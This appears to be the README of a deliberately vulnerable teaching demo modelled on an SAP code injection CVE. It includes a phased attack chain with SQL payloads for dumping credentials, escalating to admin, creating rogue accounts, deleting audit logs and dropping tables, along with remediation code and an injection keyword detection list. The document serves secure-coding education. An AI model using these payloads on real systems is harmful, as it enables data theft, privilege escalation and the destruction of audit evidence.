# CVE-2026-0488: Code Injection Vulnerability Demo (SAP CRM/S/4HANA Style)

This project is a technical demonstration of **CVE-2026-0488**, a critical code injection vulnerability found in SAP CRM and SAP S/4HANA (Scripting Editor). The vulnerability allows authenticated attackers to execute arbitrary SQL statements, resulting in full database compromise.

**CVSS v3.1 Score: 9.9 (CRITICAL)**

- Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
- Impact: Complete compromise of confidentiality, integrity, and availability

## Security Impact

This vulnerability affects:

- **Confidentiality**: Attackers can dump all database records (user data, credentials, configurations)
- **Integrity**: Attackers can modify, insert, or delete any database records
- **Availability**: Attackers can drop tables, corrupt data, or execute resource-intensive queries to DoS the system
- **Authentication Bypass**: Attackers can escalate privileges by modifying user roles
- **Audit Trail Tampering**: Attackers can cover their tracks by deleting or modifying audit logs

## What this project contains

- A Next.js app demonstrating:
  - Secure login page at `/` (uses parameterized queries)
  - Protected user dashboard at `/user` with SQL executor
  - Protected admin page at `/admin`
  - Query audit logs accessible to authenticated users
- A local PostgreSQL database in Docker (host port `5434`)
- Seeded demo users (one `user`, one `admin`) with plain-text passwords
- An intentionally vulnerable SQL executor API that executes raw user input
- Audit logging that shows attackers can cover their tracks

## Security warning

This code is intentionally insecure and should never be used in production.

- It stores passwords in plain text
- It executes arbitrary SQL from user input without parameterization
- It allows authenticated users to access and modify audit logs
- It is designed only for learning in an isolated environment

## Complete Attack Chain (Full Database Compromise)

### Phase 1: Initial Access

```
1. Attacker compromises a standard user account (phishing, reuse of breached credentials)
   → Login as user@example.com / password123
   → Receives authenticated session cookie
```

### Phase 2: Reconnaissance & Data Exfiltration

```
2. Attacker navigates to /user dashboard (protected by middleware authentication)
   → Can now access the SQL executor at /api/execute-script

3. Query all users and dump credentials:
   SELECT * FROM users;

   Result: Gets email addresses, password hashes/plain-text, and roles
   Impact: Can see admin account email
```

### Phase 3: Privilege Escalation

```
4. Attacker escalates privilege to admin:
   UPDATE users SET role = 'admin' WHERE email = 'user@example.com';

   Result: Session role still shows 'user', but database role is now 'admin'
   Impact: Next login would grant admin access, OR attacker uses admin endpoint directly if not enforced server-side
```

### Phase 4: Sensitive Data Access

```
5. Attacker could query any table (example: assume users, admin_configs, sensitive_reports):
   SELECT * FROM users WHERE role = 'admin';
   SELECT * FROM admin_configs WHERE name LIKE '%password%' OR name LIKE '%api_key%';

   Impact: Exfiltrates all data to external attacker infrastructure
```

### Phase 5: Destructive Attacks (Availability Impact)

```
6. Attacker performs destruction for either:
   a) Covering tracks: DELETE FROM query_logs; (destroys audit trail)

   b) DoS / Sabotage:
      DROP TABLE users;
      DROP TABLE important_business_data;

   Impact: Database corruption, service outage, data loss
```

### Phase 6: Persistence & Forensic Evasion

```
7. Attacker covers tracks:
   - Views query execution history: GET /api/query-logs
   - Identifies which queries were logged
   - Deletes audit trail: DELETE FROM query_logs WHERE executed_by = 'user@example.com';

   Impact: System administrators cannot trace the attack
```

## Root Cause Analysis

### The Vulnerable Code

**File: [app/api/execute-script/route.ts](app/api/execute-script/route.ts)**

```typescript
// ❌ VULNERABLE: Direct SQL execution without parameterization
const result = await getPool().query(sql); // User input directly in query

// Issue: 'sql' variable contains unsanitized user input
// Attacker can craft SQL with comments, boolean logic, UNION injection, etc.
```

### Why This Is Dangerous

1. **No Input Validation**: The endpoint accepts any valid SQL
2. **No Rate Limiting**: Attacker can execute thousands of queries
3. **No Query Logging Integrity**: Logs can be deleted by the attacker
4. **Session-Based Only**: No secondary authorization on destructive operations
5. **No Query Filtering**: No allowlist of safe operations (SELECT is as dangerous as DELETE here)

## Secure vs. Insecure Comparison

### ❌ INSECURE: Current Implementation (Vulnerable to Injection)

```typescript
// ❌ DO NOT USE THIS - Vulnerable to SQL Injection
const email = userInput;
const query = `SELECT * FROM users WHERE email = '${email}'`;
await getPool().query(query);

// Attacker input: ' OR '1'='1
// Results in: SELECT * FROM users WHERE email = '' OR '1'='1'
// Impact: Returns ALL users instead of specific user
```

### ✅ SECURE: Parameterized Queries (What Should Be Used)

```typescript
// ✅ SECURE - Uses parameterized queries with placeholders
const email = userInput;
const query = `SELECT * FROM users WHERE email = $1`;
await getPool().query(query, [email]); // Parameters passed separately

// Attacker input: ' OR '1'='1
// Results in: Query looks for user with email = "' OR '1'='1'" (literal string)
// Impact: Returns no users - injection attempt blocked
```

### ✅ SECURE: Login Implementation (Reference)

**File: [app/api/login/route.ts](app/api/login/route.ts)**

```typescript
// ✅ SECURE - Login uses parameterized queries
const result = await getPool().query(
  "SELECT * FROM users WHERE email = $1 AND password = $2",
  [email, password], // Parameters passed separately, never interpolated
);
```

This is why the login is secure while the SQL executor is vulnerable.

## How to Test the Vulnerability

### Prerequisites

```bash
npm install
docker-compose up -d
npm run db:seed
npm run dev
```

### Demo Walkthrough

**1. Login (Secure - uses parameterized queries)**

```
URL: http://localhost:3000
Email: user@demo.local
Password: user123
Result: Authenticated as standard user
```

**2. Access SQL Executor (Vulnerable)**

```
URL: http://localhost:3000/user
Vulnerability: /api/execute-script accepts ANY SQL without parameterization
```

**3. Execute SQL Injection Payloads**

```
-- Dump all users
SELECT * FROM users;

-- Escalate to admin
UPDATE users SET role = 'admin' WHERE email = 'user@demo.local';

-- View query audit trail
SELECT * FROM query_logs ORDER BY executed_at DESC LIMIT 10;

-- Cover tracks
DELETE FROM query_logs WHERE executed_by = 'user@demo.local';

-- Destructive attack (only test on demo!)
DROP TABLE query_logs;
```

**4. View Query Logs (Shows all executed SQL)**

```
URL: http://localhost:3000/user (shows query execution history at bottom)
API: GET /api/query-logs (returns JSON of last 50 executions)
```

---

## Advanced Attack Scenarios & Exploitation

### Attack 1: Reconnaissance & Information Gathering

**Enumerate Database Objects**
```sql
-- List all tables in public schema
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
-- Returns: users, query_logs
```

**Discover Sensitive Columns**
```sql
-- Find columns with sensitive keywords
SELECT table_name, column_name FROM information_schema.columns
WHERE column_name ILIKE '%password%' OR column_name ILIKE '%secret%'
   OR column_name ILIKE '%key%' OR column_name ILIKE '%token%';
```

**Verify Database Version & Capabilities**
```sql
-- Check PostgreSQL version
SELECT version();

-- Check current user privileges
SELECT current_user, session_user;
```

### Attack 2: Privilege Escalation

**Direct Role Escalation (This Demo)**
```sql
-- Attacker is logged in as: user@demo.local
UPDATE users SET role = 'admin' WHERE email = 'user@demo.local';
-- Result: Database updated, user@demo.local now has role = 'admin'
```

**Create Rogue Admin User**
```sql
INSERT INTO users (email, password, role)
VALUES ('hacker@attacker.com', 'SecurePassword123', 'admin');
-- Result: Attacker now has legitimate persistent admin account
```

### Attack 3: Data Exfiltration

**Dump All Users & Credentials**
```sql
SELECT email, password, role FROM users;
-- Impact: All user credentials exposed
```

**Extract Query Logs (See Other Users' Queries)**
```sql
SELECT * FROM query_logs ORDER BY executed_at DESC;
-- Shows what other users executed - find admin operations to mimic
```

### Attack 4: Forensic Evasion & Log Tampering

**View Query Execution History Before Deletion**
```sql
SELECT * FROM query_logs ORDER BY executed_at DESC LIMIT 50;
```

**Delete Personal Query Logs**
```sql
DELETE FROM query_logs WHERE executed_by = 'user@demo.local';
-- Result: Attacker's entire attack chain is erased from audit trail
-- Forensic Impact: Admin cannot trace the privilege escalation or data theft
```

**Partial Log Tampering (Subtle Evasion)**
```sql
DELETE FROM query_logs
WHERE executed_by = 'user@demo.local'
  AND (query_text ILIKE '%UPDATE users%' OR query_text ILIKE '%DROP%');
-- Result: Innocent SELECT queries remain, damaging UPDATE/DROP queries are gone
```

### Attack 5: Destructive Attacks (Availability Impact)

**Database Corruption**
```sql
DROP TABLE users;
DROP TABLE query_logs;
-- Result: Application cannot function, service outage
```

**Selective Data Destruction**
```sql
-- Delete admin users (prevent recovery)
DELETE FROM users WHERE role = 'admin';
-- Delete audit logs (cover evidence)
DELETE FROM query_logs;
```

**Resource Exhaustion (DoS)**
```sql
-- Execute expensive query to crash database
SELECT * FROM users u1
CROSS JOIN users u2
CROSS JOIN users u3;  -- Cartesian product causes massive memory usage

-- Or insert millions of rows
INSERT INTO query_logs (executed_by, query_text, success, rows_affected)
SELECT 'spam@example.com', 'SELECT 1', true, 1
FROM generate_series(1, 1000000);
```

---

## Security Fixes & Remediation Guide

### Fix 1: Parameterized Queries (PRIMARY DEFENSE)

**Current (Vulnerable)**
```typescript
// ❌ BAD: User input directly in query string
export async function POST(request: Request) {
  const { sql } = await request.json();
  
  // VULNERABLE: sql could be "DROP TABLE users;"
  const result = await getPool().query(sql);
  return NextResponse.json({ result });
}
```

**Fixed**
```typescript
// ✅ GOOD: Parameterized query with $1, $2 placeholders
export async function POST(request: Request) {
  const { email, role } = await request.json();
  
  // Email and role are parameters, not SQL code
  const result = await getPool().query(
    "UPDATE users SET role = $1 WHERE email = $2",
    [role, email], // Parameters passed separately
  );
  
  return NextResponse.json({ result });
}
```

**Why it works**: Database driver escapes parameters as DATA, not SQL code. `$1` and `$2` placeholders tell PostgreSQL "put a string here, don't interpret it as SQL".

### Fix 2: Server-Side Authorization Checks

**Current (Vulnerable)**
```typescript
// ❌ BAD: Only trusts client-side session cookie
const { role } = cookieStore.get("session_role")?.value;

if (role !== "admin") {
  return NextResponse.json({ error: "Unauthorized" }, { status: 403 });
}
// Problem: Attacker can set role='admin' in database, then modify cookie
```

**Fixed**
```typescript
// ✅ GOOD: Check role in database, not just cookies
const sessionEmail = cookieStore.get("session_email")?.value;

if (!sessionEmail) {
  return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
}

// CRITICAL: Query database for actual role
const userResult = await getPool().query(
  "SELECT role FROM users WHERE email = $1",
  [sessionEmail],
);

if (userResult.rows[0]?.role !== "admin") {
  return NextResponse.json({ error: "Forbidden" }, { status: 403 });
}

// Only now allow admin operation
```

**Why it works**: Cookies can be modified by attackers. Database is the single source of truth for authorization.

### Fix 3: Immutable Audit Logs

**Current (Vulnerable)**
```sql
-- ❌ Attacker can delete logs covering their tracks
CREATE TABLE query_logs (
  id SERIAL PRIMARY KEY,
  executed_by TEXT,
  query_text TEXT,
  executed_at TIMESTAMP DEFAULT NOW()
);

-- Attacker executes:
DELETE FROM query_logs WHERE executed_by = 'attacker@example.com';  -- Deleted!
```

**Fixed**
```sql
-- ✅ GOOD: Separate immutable log table with integrity checks
CREATE TABLE query_logs_immutable (
  id BIGSERIAL PRIMARY KEY,
  executed_at TIMESTAMP DEFAULT NOW() NOT NULL,
  executed_by TEXT NOT NULL,
  query_text TEXT NOT NULL,
  query_hash BYTEA NOT NULL,  -- SHA-256 hash of query
  prev_hash BYTEA,            -- Hash of previous row (chain of custody)
  signature BYTEA NOT NULL    -- HMAC signature (tampering detection)
);

-- ✅ TRIGGER: Prevent any modifications
CREATE OR REPLACE FUNCTION prevent_log_modification()
RETURNS TRIGGER AS $$
BEGIN
  RAISE EXCEPTION 'Audit logs are immutable and cannot be modified';
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER prevent_log_delete
BEFORE DELETE ON query_logs_immutable
FOR EACH ROW EXECUTE FUNCTION prevent_log_modification();

CREATE TRIGGER prevent_log_update
BEFORE UPDATE ON query_logs_immutable
FOR EACH ROW EXECUTE FUNCTION prevent_log_modification();
```

### Fix 4: Password Hashing

**Current (Vulnerable)**
```typescript
// ❌ BAD: Plain-text password storage
await getPool().query(
  "INSERT INTO users (email, password, role) VALUES ($1, $2, $3)",
  [email, plainTextPassword, "user"], // Password stored as plain text!
);

// Login query
const result = await getPool().query(
  "SELECT * FROM users WHERE email = $1 AND password = $2",
  [email, plainTextPassword], // Direct comparison
);
```

**Fixed**
```typescript
import bcrypt from "bcrypt";

// During registration/password change
const hashedPassword = await bcrypt.hash(plainTextPassword, 10); // 10 rounds
await getPool().query(
  "INSERT INTO users (email, password, role) VALUES ($1, $2, $3)",
  [email, hashedPassword, "user"], // Store hash, not plain text
);

// During login
const result = await getPool().query(
  "SELECT * FROM users WHERE email = $1",
  [email], // Find user by email
);

if (result.rows.length === 0) {
  return NextResponse.json({ error: "Invalid credentials" }, { status: 401 });
}

// Compare plain-text input with hash
const isPasswordValid = await bcrypt.compare(
  plainTextPassword,
  result.rows[0].password, // Hash stored in DB
);

if (!isPasswordValid) {
  return NextResponse.json({ error: "Invalid credentials" }, { status: 401 });
}
```

### Fix 5: Query Allowlisting & Timeout

```typescript
// ✅ GOOD: Use allowlist for table names, parameters for values
const ALLOWED_TABLES = {
  users: true,
  admin_configs: true,
};

const tableName = request.query.table as string;
if (!ALLOWED_TABLES[tableName]) {
  throw new Error("Invalid table");
}

// Now safe: tableName is validated, parameters are still parameterized
const result = await getPool().query(
  `SELECT * FROM ${tableName} WHERE id = $1`,
  [id],
);

// Add query timeout
const result = await getPool().query({
  text: `SELECT * FROM users WHERE id = $1`,
  values: [id],
  timeout: 5000, // 5 second timeout prevents resource exhaustion
});
```

### Fix 6: Rate Limiting

```typescript
// ✅ GOOD: Limit query frequency per user
const queryCount = await getQueryCountLastMinute(userEmail);
if (queryCount > 100) {
  return NextResponse.json(
    { error: "Rate limit exceeded" },
    { status: 429 }
  );
}
```

### Fix 7: Security Monitoring & Alerting

```typescript
// ✅ GOOD: Alert on suspicious activity
async function checkForSuspiciousActivity(email: string) {
  // Queries that look like injection attempts
  const suspiciousPatterns = [
    'DROP',
    'DELETE FROM',
    'TRUNCATE',
    'ALTER TABLE',
    'UNION',
    '--', // SQL comment
    '/*', // SQL comment
  ];

  const recentQueries = await getQueryHistory(email, 5);
  
  for (const query of recentQueries) {
    for (const pattern of suspiciousPatterns) {
      if (query.query_text.toUpperCase().includes(pattern)) {
        await sendSecurityAlert({
          severity: 'HIGH',
          message: `Suspicious query detected from ${email}: ${pattern}`,
          query: query.query_text,
        });
      }
    }
  }
}
```

---

## CVSS 3.1 Scoring Breakdown

| Factor                       | Value   | Reasoning                                                     |
| ---------------------------- | ------- | ------------------------------------------------------------- |
| **Attack Vector (AV)**       | Network | Vulnerability exploitable over network (HTTP endpoint)        |
| **Attack Complexity (AC)**   | Low     | No complex conditions needed; straightforward SQL execution   |
| **Privileges Required (PR)** | Low     | Requires valid user account (not high-privilege)              |
| **User Interaction (UI)**    | None    | No user interaction needed; automated exploitation possible   |
| **Scope (S)**                | Changed | Impact extends beyond vulnerable component to entire database |
| **Confidentiality (C)**      | High    | Full database disclosure possible                             |
| **Integrity (I)**            | High    | Any database record can be modified or deleted                |
| **Availability (A)**         | High    | Database can be corrupted, tables dropped, service DoS'd      |
| **Base Score**               | **9.9** | (High confidence)                                             |

**Why 9.9 is Critical:**

- Requires only low privilege (standard user), not admin
- No user interaction or complex setup needed
- Impacts all three security pillars: C, I, A
- Affects the entire system scope (database breach)
- Only missing element for 10.0: requires network access (not local privilege escalation)

---

## Real-World SAP Impact

In production SAP environments:

- **Data Breach**: Customer PII, financial records, contracts exposed
- **Regulatory Penalties**: GDPR, CCPA, industry-specific regulations (PCI-DSS for payment data)
- **Business Continuity**: Database destruction, availability loss, reputation damage
- **Supply Chain Risk**: If SAP used for supplier data, breach affects entire ecosystem
- **Forensics Impossible**: Audit trail destruction prevents root cause analysis

## How SAP Fixed CVE-2026-0488

In the real SAP vulnerability:

1. **Restricted Execution Context**: Generic function modules run in sandboxed environment
2. **Input Validation**: Strict validation of script inputs
3. **Query Parameterization**: All database access uses parameterized statements
4. **Audit Logging Integrity**: Immutable audit trails that attackers cannot modify
5. **Least Privilege**: Function modules run with minimal necessary permissions

## Defense Mechanisms Against This Class of Vulnerability

### 1. Parameterized Queries (Primary Defense)

```typescript
// Always use parameterized queries for ALL database operations
const result = await pool.query(
  "UPDATE users SET role = $1 WHERE id = $2",
  [newRole, userId], // Parameters never interpolated into query string
);
```

### 2. Input Validation & Allowlisting

```typescript
// Whitelist allowed operations instead of trying to blacklist dangerous ones
const ALLOWED_OPERATIONS = ["SELECT", "INSERT", "UPDATE"];
if (!ALLOWED_OPERATIONS.includes(sql.toUpperCase().split(" ")[0])) {
  throw new Error("Operation not allowed");
}
```

### 3. Query Audit Logging with Integrity

```typescript
// Log queries in immutable format (append-only with cryptographic signing)
await logQueryWithSignature(
  userEmail,
  query,
  timestamp,
  cryptographicHash, // Makes log tampering detectable
);
```

### 4. Role-Based Access Control (Server-Side)

```typescript
// ALWAYS verify permissions server-side, not just client-side
if (user.role !== "admin") {
  throw new Error("Unauthorized");
}

// Never trust cookies/session data for authorization of sensitive operations
```

### 5. Rate Limiting & Anomaly Detection

```typescript
// Limit query frequency per user
const queryCount = await getQueryCountLastMinute(userEmail);
if (queryCount > 100) {
  throw new Error("Rate limit exceeded");
}
```

### 6. Immutable Audit Trails

```typescript
// Ensure audit logs cannot be deleted by application users
// Consider: database-level triggers, separate immutable log storage, SIEM forwarding
```

---

## Presentation Structure (8 Minutes)

**Slide 1 (0:00-0:30)** - Title & CVE Overview
- CVE-2026-0488, CVSS 9.9
- Real SAP vulnerability reference
- Impact summary

**Slide 2 (0:30-2:00)** - Vulnerability Demonstration
- Show login endpoint (secure with parameterized queries)
- Show execute-script endpoint (vulnerable to arbitrary SQL)
- Live demo: `SELECT * FROM users;`
- Show database response with credentials

**Slide 3 (2:00-3:30)** - Attack Chain
- Phase 1: Initial access (standard user login)
- Phase 2: Reconnaissance (enumerate database)
- Phase 3: Privilege escalation (UPDATE users SET role)
- Phase 4: Data exfiltration (SELECT credentials)

**Slide 4 (3:30-5:00)** - Code Comparison
- ❌ Vulnerable: Raw query execution
- ✅ Secure: Parameterized query
- Why parameterization matters
- Show actual code differences

**Slide 5 (5:00-7:00)** - Defense Mechanisms
- Layer 1: Input validation (allowlisting)
- Layer 2: Parameterized queries (primary)
- Layer 3: Server-side authorization
- Layer 4: Immutable audit logging
- Layer 5: Rate limiting
- Layer 6: Security monitoring

**Slide 6 (7:00-8:00)** - Wrap-up
- Key takeaways: Parameterization prevents injection
- Why this matters in real SAP systems
- Questions?

---

## Files in This Demo

- **[app/api/execute-script/route.ts](app/api/execute-script/route.ts)** - Vulnerable SQL executor (intentionally insecure)
- **[app/api/login/route.ts](app/api/login/route.ts)** - Secure login (reference implementation)
- **[app/api/query-logs/route.ts](app/api/query-logs/route.ts)** - Query history endpoint (shows forensic evasion surface)
- **[app/user/page.tsx](app/user/page.tsx)** - User dashboard with SQL execution interface
- **[app/admin/page.tsx](app/admin/page.tsx)** - Admin dashboard (role escalation target)
- **[app/middleware.ts](app/middleware.ts)** - Route protection (authentication enforcement)
- **[db/seed.sql](db/seed.sql)** - Database schema with audit logging table
- **[docker-compose.yml](docker-compose.yml)** - PostgreSQL 16 setup

## Learning Objectives

By studying this code, you'll understand:

1. ✅ How SQL injection attacks work at application layer
2. ✅ Why parameterized queries are essential
3. ✅ How authentication ≠ authorization (user can escalate own privileges)
4. ✅ How audit logs become attack surface (log tampering)
5. ✅ CVSS scoring methodology and risk assessment
6. ✅ Defense-in-depth: multiple layers needed (parameterization + validation + logging + RBAC)
7. ✅ Real-world implications: business impact, regulatory compliance, incident response

## Setup and run

From this folder (`sql-injection`):

1. Install dependencies

```bash
npm install
```

2. Create local env file

```bash
cp .env.example .env.local
```

3. Start PostgreSQL container

```bash
docker compose up -d
```

4. Seed database (safe to run repeatedly)

```bash
npm run db:seed
```

5. Start app

```bash
npm run dev
```

6. Open app

`http://localhost:3000`

## Demo credentials

- User: `user@demo.local` / `user123`
- Admin: `admin@demo.local` / `admin123`

## Notes for developers

- `docker-compose.yml` maps host `5434 -> container 5432` to avoid conflict with an existing local Postgres on `5432`.
- The `db:seed` script uses `.env.local` and repopulates `users` deterministically.
- This repository intentionally demonstrates bad practices to teach secure coding.
- **Vulnerability**: /api/execute-script accepts ANY SQL without parameterization
- **Secure Reference**: /api/login uses parameterized queries with $1, $2 placeholders

## References

- **CVE-2026-0488 Case Study**: https://www.inprosec.com/en/sap-security-notes-february-2026/
- **SAP Security Notes**: SAP Security Update Notification
- **CVSS Calculator**: https://www.first.org/cvss/calculator/3.1
- **OWASP SQL Injection**: https://owasp.org/www-community/attacks/SQL_Injection
- **PostgreSQL Parameterized Queries**: https://node-postgres.com/features/queries#parameterized-queries
